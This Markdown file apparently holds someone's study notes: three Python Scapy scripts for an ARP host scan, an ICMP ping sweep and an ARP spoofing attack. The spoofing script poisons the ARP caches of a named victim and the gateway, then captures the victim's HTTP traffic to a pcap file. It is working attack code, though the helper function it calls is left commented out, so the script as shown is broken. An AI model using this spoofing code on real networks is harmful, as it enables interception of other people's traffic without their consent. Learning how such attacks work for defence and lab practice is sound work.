- [Scan with ARP](#scan-with-arp)
- [ARPSpoofing](#ARPSpoofing)
- [Scan with ICMP](#Scan-with-ICMP)

## Scan with ARP

```Python
from scapy.all import Ether
from scapy.all import ARP
from scapy.all import srp
import ipaddress

def main():
    myip = input("What is Your IP?:")
    netmask = input("What is SubnetMask?:")
    hwaddr = 'ff:ff:ff:ff:ff:ff'

    cidr = gen_cidr(myip, netmask)
    print('Scanning on: ' + cidr + '\n')

    pkt = Ether(dst=hwaddr)/ARP(op=1, pdst=cidr)    # op=1:arpリクエスト(ブロードキャスト) op=2:arpレスポンス(ユニキャスト)
    ans, uans = srp(pkt, timeout=30)

    print("")
    for send, recv in ans:
        print(recv.sprintf('%ARP.psrc% is up.'))


def gen_cidr(ip, netmask):
    ipv4 = ipaddress.ip_address(ip)
    netmask = ipaddress.ip_address(netmask)
    netaddr = ipaddress.ip_interface(int(ipv4) & int(netmask))
    netaddr = str(netaddr).split('/')[0]

    cidr = bin(int(netmask)).count('1')
    return str(netaddr) + '/' + str(cidr)

if __name__ == '__main__':
    main()

```

## ARPSpoofing

```Python
from scapy.all import *
import os
import sys
import threading
import signal
import configparser

"""
参考サイト
    - https://engineeringnote.hateblo.jp/entry/python/bhp/4-2
"""

def main():
    # 設定ファイルconfig.iniをロードする
    config = configparser.ConfigParser()
    config.read('./config.ini', 'UTF-8')
    victim_ip = config.get('victim', 'ip')
    host_ip = config.get('attacker', 'ip')
    gateway_ip = config.get('gateway', 'ip')
    interface = config.get('interface', 'interface')

    packet_count = 200
    conf.iface = interface
    conf.verb = 0
    print("[*] Setting up {}".format(interface))

    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")
                                /ARP(pdst=gateway_ip))
                                # timeout=2)
                                # retry=10)

    for s, r in responses:
        gateway_mac = r[Ether].src

    gateway_mac = resolve_mac(gateway_ip)
    if not gateway_mac:
        print("[!!!] Failed to get gateway MAC. Exiting.")
        sys.exit(1)
    else:
        print("[*] Gateway {} is at {}".format(gateway_ip, gateway_mac))

    victim_mac = resolve_mac(victim_ip)
    if not victim_mac:
        print("[!!!] Failed to get target MAC. Exiting.")
        sys.exit(1)
    print("[*] Target {} is at {}".format(victim_ip, victim_mac))

    stop_event = threading.Event()
    poison_thread = threading.Thread(
        target=poison_target,
        args=[
            gateway_ip,
            gateway_mac,
            victim_ip,
            victim_mac,
            stop_event
        ]
    )
    poison_thread.start()

    print("[*] starting sniffer for {} packets".format(packet_count))
    bpf_filter = "ip host {} and tcp port 80".format(victim_ip)
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
    wrpcap('arper.pcap', packets)
    stop_event.set()
    poison_thread.join()

    input()
    restore_target(gateway_ip, gateway_mac, victim_ip, victim_mac)
"""
# # MACアドレス取得  動作確認済み
# def resolve_mac(ip_address):
#     responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
#     for s, r in responses:
#         return r[Ether].src
#     return None
"""
def poison_target(gateway_ip, gateway_mac, victim_ip, victim_mac, stop_event):
    poison_target = ARP()   # ARPパケットの生成
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = victim_ip
    poison_target.hwdst = victim_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = victim_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop]")
    while True:
        send(poison_target)
        send(poison_gateway)
        if stop_event.wait(2):
            break
    print("[*] ARP poison attack finished.")
    return

def restore_target(gateway_ip, gateway_mac, victim_ip, victim_mac):
    print("[*] Restoring target...")
    send(ARP(op=2, psrc=gateway_ip, pdst=victim_ip,
        hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=victim_ip, pdst=gateway_ip,
        hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim_mac), count=5)

if __name__ == '__main__':
    main()
```


## Scan with ICMP

```Python
from scapy.all import IP
from scapy.all import ICMP
from scapy.all import sr1
import ipaddress

def main():
    myip = input("What is Your IP ?:")
    netmask = input("What is SubnetMask ?:")

    ip_list = gen_iplist(myip, netmask)

    for ip in ip_list:
        pkt = IP(dst=str(ip), ttl=64)/ICMP()    # ttlとはパケットの生存時間 難題のルータを経由するかを指定
        reply = sr1(pkt, timeout=3)

        if reply is not None:
            print("{} is up".format(str(ip)))
            with open('./ipList.txt', 'a') as f:
                print("{} is up".format(str(ip)), file = f)

def gen_iplist(ip, netmask):
    ipv4 = ipaddress.ip_address(ip)
    # IPv4Address('192.168.1.149')

    netmask = ipaddress.ip_address(netmask)
    # IPv4Address('255.255.255.0')

    netaddr = ipaddress.ip_interface(int(ipv4) & int(netmask))
    # IPv4Address('192.168.1.0')

    netaddr = str(netaddr).split('/')
    # ['192.168.1.0']

    netaddr = netaddr[0]
    # '192.168.1.0'

    cidr = bin(int(netmask)).count('1')     # プレフィックス取得
    print(str(netaddr) + '/' + str(cidr))   # '192.168.1.0/24'

    ip_network = ipaddress.ip_network(str(netaddr) + '/' + str(cidr))
    # IPv4Network('192.168.1.0/24')

    return ip_network.hosts()

if __name__ == '__main__':
    main()
```